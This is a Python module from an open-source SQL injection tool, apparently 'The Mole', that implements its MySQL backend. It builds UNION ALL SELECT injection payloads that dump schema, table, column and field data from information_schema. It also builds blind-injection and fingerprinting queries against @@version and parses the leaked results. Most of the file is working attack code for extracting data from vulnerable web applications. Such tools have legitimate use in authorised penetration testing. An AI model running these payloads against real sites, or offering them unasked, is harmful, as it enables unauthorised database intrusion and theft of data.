#!/usr/bin/python3
# 
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation; either version 3 of the License, or
# (at your option) any later version.
#       
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#       
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston,
# MA 02110-1301, USA.
#
# Developed by: Nasel(http://www.nasel.com.ar)
# 
# Authors:
# Matías Fontanini
# Santiago Alessandri
# Gastón Traberg

from dbmsmoles import DbmsMole, FingerBase

class MysqlMole(DbmsMole):
    out_delimiter_result = "::-::"
    out_delimiter = DbmsMole.to_hex(out_delimiter_result)
    inner_delimiter_result = "><"
    inner_delimiter = DbmsMole.to_hex(inner_delimiter_result)

    @classmethod
    def to_string(cls, data):
        return DbmsMole.to_hex(data)
    
    def _schemas_query_info(self):
        return {
            'table' : 'information_schema.schemata',
            'field' : 'schema_name'
        }
    
    def _tables_query_info(self, db):
        return {
            'table' : 'information_schema.tables',
            'field' : 'table_name',
            'filter': "table_schema = '{db}'".format(db=db)
        }
    
    def _columns_query_info(self, db, table):
        return {
            'table' : 'information_schema.columns',
            'field' : 'column_name',
            'filter': "table_schema = '{db}' and table_name = '{table}'".format(db=db, table=table)
        }
        
    def _fields_query_info(self, fields, db, table, where):
        return {
            'table' : db + '.' + table,
            'field' : ','.join(map(lambda x: 'IFNULL(' + x + ', 0x20)', fields)),
            'filter': where
        }
        
    def _dbinfo_query_info(self):
        return {
            'field' : 'user(),version(),database()', 
            'table' : ''
        }
    
    def _concat_fields(self, fields):
        return 'CONCAT_WS(' + MysqlMole.inner_delimiter + ',' + ','.join(map(lambda x: 'IFNULL(' + x + ', 0x20)', fields)) + ')'
    
    @classmethod
    def injectable_field_fingers(cls, query_columns, base):
        hashes = []
        to_search = []
        for i in range(0, query_columns):
            hashes.append(DbmsMole.to_hex(str(base + i)))
            to_search.append(str(base + i))
        return [FingerBase(hashes, to_search)]
    
    @classmethod
    def dbms_name(cls):
        return 'Mysql'
    
    @classmethod
    def blind_field_delimiter(cls):
        return MysqlMole.inner_delimiter_result
    
    @classmethod
    def field_finger_query(cls, columns, finger, injectable_field):
        query = " and 1 = 0 UNION ALL SELECT "
        query_list = list(map(str, range(columns)))
        query_list[injectable_field] = 'CONCAT(@@version,' + DbmsMole.to_hex(DbmsMole.field_finger_str) + ')'
        query += ",".join(query_list)
        return query

    @classmethod
    def dbms_check_blind_query(cls):
        return ' and 0 < (select length(@@version)) '

    def forge_query(self, column_count, fields, table_name, injectable_field, where = "1=1", offset = 0):
        query = " and 1=0 UNION ALL SELECT "
        query_list = list(map(str, range(column_count)))
        query_list[injectable_field] = ("CONCAT(" +
                                            MysqlMole.out_delimiter +
                                            ",CONCAT_WS(" +
                                                MysqlMole.inner_delimiter + "," + 
                                                fields +
                                            ")," +
                                            MysqlMole.out_delimiter +
                                        ")")
        query += ','.join(query_list)
        if len(table_name) > 0:
            query += " from " + table_name 
            query += " where " + self.parse_condition(where) + \
                     " limit 1 offset " + str(offset) + " "
        return query

    def parse_results(self, url_data):
        data_list = url_data.split(MysqlMole.out_delimiter_result)
        if len(data_list) < 3:
            return None
        data = data_list[1]
        return data.split(MysqlMole.inner_delimiter_result)
    
    def __str__(self):
        return "Mysql Mole"
